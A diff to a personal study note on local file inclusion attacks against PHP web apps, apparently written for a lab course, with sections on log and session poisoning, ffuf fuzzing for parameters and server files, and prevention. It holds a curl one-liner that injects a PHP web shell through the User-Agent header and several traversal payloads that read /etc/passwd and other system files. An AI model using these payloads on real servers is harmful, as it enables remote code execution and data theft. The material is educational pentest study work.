@@ -42,7 +42,7 @@ Sometimes the server will be set to replace `../` with with empty space (i.e., r
 In other cases we can try  `..././` or `....\/`
 
 ### Encoding
-We can also try url encoding. But note taht for this to work we must RL encode all the characters including the dots.  Some URL encoders may not encode dots.
+We can also try url encoding. But note that for this to work we must RL encode all the characters including the dots.  Some URL encoders may not encode dots.
 
 ### Approved Paths
 Some web apps will use RegEx to make sure that the file included is under a specific path. To circumvent this, find the path that is approved by examing the existing forms and web functionality. Then start our payload witht he approved path and traverse back up again. Something like: `./languages/../../../../etc/passwd`
@@ -259,3 +259,176 @@ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
 
 Upload, then call it:
 `http://SERVERIP:PORT/index.php?language=har://./profile_images/shell.jpg%2Fshell.text&cmd=id`
+
+## Log Poisoning
+In this attack we poison a log file by writing PHP code in a field that gets logged into a log file. Then we include that log file to execute the PHP code. The PHP web application needs read privileges over the logged files.
+
+Any of the functions with execute privileges are vulnerable to this attack.
+
+### PHP Session Poisoning
+
+Most PHP web apps use `PHPSESSID` cookies. They hold user-related data on the back-end that are stored in session files and saved in `/var/lib/php/sessions` on Linux and in `C:\Windows\temp` on Windows. The name of the file that contains our user's data mtaches the name of our PHPSESSID cookie with the `sess_` prefix. Example: `PHPSESSID` cookie is  `el4ukv0kqbvoirg7nkp4dncpk3` then location on disk is `/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3`
+
+For a PHP Session poisoning attack we first see if our PHPSESSID has any data under our control. If we see something under our control, we try and set it then check the file location on disk.
+
+If we can, then we change the parameter to a URL encoded web shell.
+
+Then we can include the session file with &cmd=id to execute commands.
+
+### Server Log Poisoning
+
+Apache and Nginx maintain many logs including the `access.log` and `error.log`. The `access.log` contains variou information that includes the `User-Agent` header. We can control this header, so we can use it to poison the server.
+
+Once poisoned we need to include the log through the LFI vulnerability, so we need read acess over the logs. Nginx logs are readable by low privileged users but Apache are not.
+
+Default log locations :`/var/log/apache2` or `C:\xampp\apache\logs\`
+
+The logs may be in other areas, there is an LFI wordlist to fuzz for their lcoations. First we include the log to see if we can see it and if it's there.
+
+Be careful. logs are huge and loading them can take a whiel to load or crash the server.
+
+If we can see it, we use BurpSuite to intercept our LFI request and modify the `User-Agent` header to poison the log. We could also use curl: 
+```shell-session
+$ curl -s http://<SERVER_IP>:<PORT>/index.php -A "<?php system($_GET['cmd']); ?>"
+```
+Note that the use of single quotes here is importnat. The double quotes will be misinterpreted for the string "quote;", PHP will throw an error and nothing will be executed.
+
+Now we can execute by including the poisoned log with a command.
+
+Note that the `User-Agent` header is also shown on the process files under the Linux `/proc` directory.
+
+Finally, there are other similar log poisoning techniques that we may utilize on various system logs, depending on which logs we have read access over. The following are some of the service logs we may be able to read:
+
+-   `/var/log/sshd.log`
+-   `/var/log/mail`
+-   `/var/log/vsftpd.log`
+
+We should first attempt reading these logs through LFI, and if we do have access to them, we can try to poison them as we did above. For example, if the `ssh` or `ftp` services are exposed to us, and we can read their logs through LFI, then we can try logging into them and set the username to PHP code, and upon including their logs, the PHP code would execute. The same applies the `mail` services, as we can send an email containing PHP code, and upon its log inclusion, the PHP code would execute. We can generalize this technique to any logs that log a parameter we control and that we can read through the LFI vulnerability.
+
+## Automated Scnaning
+
+There are many automated methods that can help us quickly identify and exploit trivial LFI vulnerabilites.
+
+### Fuzzing Parameters
+HTML forms are generally properly tested and well secured. The page may expose other parameters, however, that are not linked to any HTML forms that normal users would not normally access or unintentionally cause harm through. Therefore, we need to fuzz for exposed parameters.
+
+Using `ffuf`:
+```shell-session
+ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
+
+...SNIP...
+
+ :: Method           : GET
+ :: URL              : http://<SERVER_IP>:<PORT>/index.php?FUZZ=value
+ :: Wordlist         : FUZZ: /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+ :: Filter           : Response size: xxx
+________________________________________________
+
+language                    [Status: xxx, Size: xxx, Words: xxx, Lines: xxx]
+```
+
+**Tip:** For a more precise scan, we can limit our scan to the most popular LFI parameters found on this [link](https://book.hacktricks.xyz/pentesting-web/file-inclusion#top-25-parameters).
+
+### LFI Wordlists
+There are a number of [LFI Wordlists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) we can use for this scan. A good wordlist is [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt), as it contains various bypasses and common files, so it makes it easy to run several tests at once.
+```shell-session
+ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
+
+...SNIP...
+
+ :: Method           : GET
+ :: URL              : http://<SERVER_IP>:<PORT>/index.php?FUZZ=key
+ :: Wordlist         : FUZZ: /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+ :: Filter           : Response size: xxx
+________________________________________________
+
+..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
+```
+
+### Fuzzzing Server Files
+
+We're interested in:
+* `Server webroot path`
+* `Server configuration files`
+* `Server logs`
+
+#### Server Webroot
+We can fuzz for index.php using [wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or this [wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). We may need to add a few back directories. (e.g., `../../../../`)
+
+```shell-session
+ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
+
+...SNIP...
+
+: Method           : GET
+ :: URL              : http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+ :: Filter           : Response size: 2287
+________________________________________________
+
+/var/www/html/          [Status: 200, Size: 0, Words: 1, Lines: 1]
+```
+
+We may also use the same [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) wordlist we used earlier, as it also contains various payloads that may reveal the webroot.
+
+#### Server Logs/Configurations
+Look for logs and configurations, we may also use the [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) wordlist, as it contains many of the server logs and configuration paths we may be interested in. If we wanted a more precise scan, we can use this [wordlist for Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux) or this [wordlist for Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows), though they are not part of `seclists`, so we need to download them first. Let's try the Linux wordlist against our LFI vulnerability, and see what we get:
+```shell-session
+Morrigar@htb[/htb]$ ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
+
+...SNIP...
+
+ :: Method           : GET
+ :: URL              : http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ
+ :: Wordlist         : FUZZ: ./LFI-WordList-Linux
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+ :: Filter           : Response size: 2287
+________________________________________________
+
+/etc/hosts              [Status: 200, Size: 2461, Words: 636, Lines: 72]
+/etc/hostname           [Status: 200, Size: 2300, Words: 634, Lines: 66]
+/etc/login.defs         [Status: 200, Size: 12837, Words: 2271, Lines: 406]
+/etc/fstab              [Status: 200, Size: 2324, Words: 639, Lines: 66]
+/etc/apache2/apache2.conf [Status: 200, Size: 9511, Words: 1575, Lines: 292]
+/etc/issue.net          [Status: 200, Size: 2306, Words: 636, Lines: 66]
+...SNIP...
+/etc/apache2/mods-enabled/status.conf [Status: 200, Size: 3036, Words: 715, Lines: 94]
+/etc/apache2/mods-enabled/alias.conf [Status: 200, Size: 3130, Words: 748, Lines: 89]
+/etc/apache2/envvars    [Status: 200, Size: 4069, Words: 823, Lines: 112]
+/etc/adduser.conf       [Status: 200, Size: 5315, Words: 1035, Lines: 153]
+```
+## File Inclusion Prevention
+
+The most important thing is to avoid passing user-controlled inputs into any file inclusion functions or APIs. If we know what we want inputed, we should create a complete whitelist of all options.
+
+### Prevent Directory Traversal
+
+Use functions that will only read the basename. Remove `../` recursively.
+
+### Web Server Configuration
+
+Glabally disable the inclusion of remote files bys etting `allow_url_fopen` and `allow_url_include` to off.
+
+Lock web applications to there root directory. Perhaps through Docker.Turn off dangerous modules like `PHP Expect mod_userdir`.
+
+### [[Cybersecurity/Bug Bounties/Web Application Firewall (WAF)\|WAF]]
+The universal way to harden applications is to use a WAF.
